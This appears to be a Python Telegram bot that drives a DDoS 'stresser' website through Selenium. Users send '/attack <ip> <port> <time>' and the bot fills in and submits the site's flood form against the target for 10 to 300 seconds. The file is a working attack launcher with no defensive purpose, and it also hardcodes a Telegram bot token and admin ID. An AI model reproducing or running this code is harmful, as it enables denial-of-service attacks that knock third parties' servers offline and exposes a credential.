import os
import json
import logging
import threading
import time
from datetime import datetime
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import asyncio

# ==================== CONFIG ====================
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8521144614:AAE-P7L4SKCMk5ZaggzU4jZmhmbMMBUhUJA"
ADMIN_IDS = [7820814565]  # Sirf admin ID

# Website details
WEBSITE_URL = "https://satellitestress.st/attack"
LOGIN_URL = "https://satellitestress.st/login"

# ==================== GLOBAL BROWSER (Admin login karega) ====================
driver = None
browser_ready = False
browser_lock = threading.Lock()

def init_browser():
    """Browser initialize karo aur login page kholo"""
    global driver, browser_ready
    try:
        options = webdriver.ChromeOptions()
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        # Headless mode nahi rakhte taaki admin login dekh sake
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=options)
        driver.get(LOGIN_URL)
        print("="*50)
        print("🔐 Browser opened. Please login manually in the browser window.")
        print("After login, type /ready in bot to continue.")
        print("="*50)
        browser_ready = False  # Jab tak admin /ready na kare
    except Exception as e:
        print(f"❌ Browser init error: {e}")
        browser_ready = False

# Thread mein browser start karo
threading.Thread(target=init_browser, daemon=True).start()

# ==================== TELEGRAM COMMANDS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ You are not authorized to use this bot.")
        return
    
    await update.message.reply_text(
        "🤖 **Admin Bot Started**\n\n"
        "1. Browser automatically opened.\n"
        "2. Login to the website manually.\n"
        "3. After login, type /ready\n\n"
        "Users can then use /attack command."
    )

async def ready(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin ne login kar liya - ab browser ready hai"""
    global browser_ready
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        return
    
    if driver is None:
        await update.message.reply_text("❌ Browser not initialized. Restart bot.")
        return
    
    browser_ready = True
    await update.message.reply_text(
        "✅ **Browser is ready!**\n\n"
        "Users can now use:\n"
        "`/attack <ip> <port> <time>`\n"
        "Example: `/attack 1.1.1.1 80 60`"
    )

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """User attack command - browser reuse karega"""
    global driver, browser_ready
    
    if not browser_ready or driver is None:
        await update.message.reply_text("⏳ Bot is not ready yet. Admin is setting up...")
        return
    
    # Parse arguments
    args = context.args
    if len(args) != 3:
        await update.message.reply_text(
            "❌ Use: `/attack <ip> <port> <time>`\n"
            "Example: `/attack 1.1.1.1 80 60`"
        )
        return
    
    ip, port_str, time_str = args
    
    # Validate port
    try:
        port = int(port_str)
        if port < 1 or port > 65535:
            await update.message.reply_text("❌ Port must be 1-65535")
            return
    except:
        await update.message.reply_text("❌ Invalid port")
        return
    
    # Validate time
    try:
        duration = int(time_str)
        if duration < 10 or duration > 300:
            await update.message.reply_text("❌ Time must be 10-300 seconds")
            return
    except:
        await update.message.reply_text("❌ Invalid time")
        return
    
    # Send initial message
    msg = await update.message.reply_text(
        f"🔄 **Launching attack...**\n"
        f"Target: `{ip}:{port}`\n"
        f"Duration: {duration}s"
    )
    
    # Browser mein attack karo (alag thread mein taaki bot block na ho)
    def attack_thread():
        with browser_lock:
            try:
                # Current tab mein attack page open karo
                driver.get(WEBSITE_URL)
                wait = WebDriverWait(driver, 10)
                
                # Saare input fields dhundho
                inputs = wait.until(EC.presence_of_all_elements_located((By.TAG_NAME, "input")))
                
                # Filter visible inputs
                visible = []
                for inp in inputs:
                    if inp.is_displayed() and inp.get_attribute('type') != 'hidden':
                        visible.append(inp)
                
                if len(visible) >= 3:
                    # IP field
                    visible[0].clear()
                    visible[0].send_keys(ip)
                    
                    # Port field
                    visible[1].clear()
                    visible[1].send_keys(str(port))
                    
                    # Time field
                    visible[2].clear()
                    visible[2].send_keys(str(duration))
                    
                    # Launch button dhundho
                    buttons = driver.find_elements(By.TAG_NAME, "button")
                    launch_btn = None
                    for btn in buttons:
                        if "Launch" in btn.text:
                            launch_btn = btn
                            break
                    
                    if launch_btn:
                        launch_btn.click()
                        time.sleep(2)
                        
                        # Send success message
                        async def send_success():
                            await context.bot.send_message(
                                chat_id=update.effective_chat.id,
                                text=f"✅ **Attack launched!**\n\n`{ip}:{port}` for {duration}s"
                            )
                        asyncio.run_coroutine_threadsafe(send_success(), asyncio.get_event_loop())
                    else:
                        async def send_error():
                            await context.bot.send_message(
                                chat_id=update.effective_chat.id,
                                text="❌ Launch button not found"
                            )
                        asyncio.run_coroutine_threadsafe(send_error(), asyncio.get_event_loop())
                else:
                    async def send_error():
                        await context.bot.send_message(
                            chat_id=update.effective_chat.id,
                            text=f"❌ Only {len(visible)} inputs found"
                        )
                    asyncio.run_coroutine_threadsafe(send_error(), asyncio.get_event_loop())
                    
            except Exception as e:
                async def send_error():
                    await context.bot.send_message(
                        chat_id=update.effective_chat.id,
                        text=f"❌ Attack error: {str(e)}"
                    )
                asyncio.run_coroutine_threadsafe(send_error(), asyncio.get_event_loop())
    
    threading.Thread(target=attack_thread).start()

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check browser status"""
    if browser_ready:
        await update.message.reply_text("✅ Browser is ready. Attack can be launched.")
    else:
        await update.message.reply_text("⏳ Browser is not ready yet. Admin is logging in.")

# ==================== MAIN ====================
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("ready", ready))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("status", status))
    
    print("="*50)
    print("🤖 SELENIUM BOT STARTED")
    print("="*50)
    print("👑 Admin only: /start, /ready")
    print("👥 Users: /attack ip port time")
    print("="*50)
    
    app.run_polling()

if __name__ == "__main__":
    main()
